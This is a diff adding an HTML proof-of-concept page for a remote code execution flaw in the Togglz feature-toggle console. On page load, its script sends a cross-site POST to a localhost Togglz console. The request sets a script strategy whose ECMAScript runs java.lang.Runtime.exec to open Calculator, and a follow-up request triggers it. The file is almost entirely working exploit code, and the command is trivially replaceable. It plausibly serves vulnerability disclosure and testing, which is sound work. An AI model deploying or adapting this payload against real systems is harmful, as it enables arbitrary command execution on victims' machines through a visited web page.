@@ -1,0 +1,27 @@
+<html>
+<head>
+  </head>
+  <body onload="execTogglz()">
+    This contains the payload for the Togglz RCE. If all goes well you should see the calculator app open.
+
+    </body>
+    <script>
+    function execTogglz() {
+
+      var data = "f=HELLO_WORLD&enabled=enabled&strategy=script&p1=&p2=&p3=&p4=ECMAScript&p5=java.lang.Runtime.getRuntime%28%29.exec%28%27open+%2FSystem%2FApplications%2FCalculator.app%2F%27%29%3B%0D%0A0+%3D%3D+0%3B&p6=&p7=&p8=&p9=&p10=&p11=&p12=&p13=&p14=&p15=&p16=";
+
+      var xhr = new XMLHttpRequest();
+
+      xhr.open("POST", "http://localhost:8080/togglz-console/edit");
+      xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded");
+      xhr.send(data);
+      sleep(1000);
+      var triggerFeatureToggle =  new XMLHttpRequest();
+      triggerFeatureToggle.open("GET", "http://localhost:8080/");
+      triggerFeatureToggle.send(null);
+    }
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    </script>
+    </html>
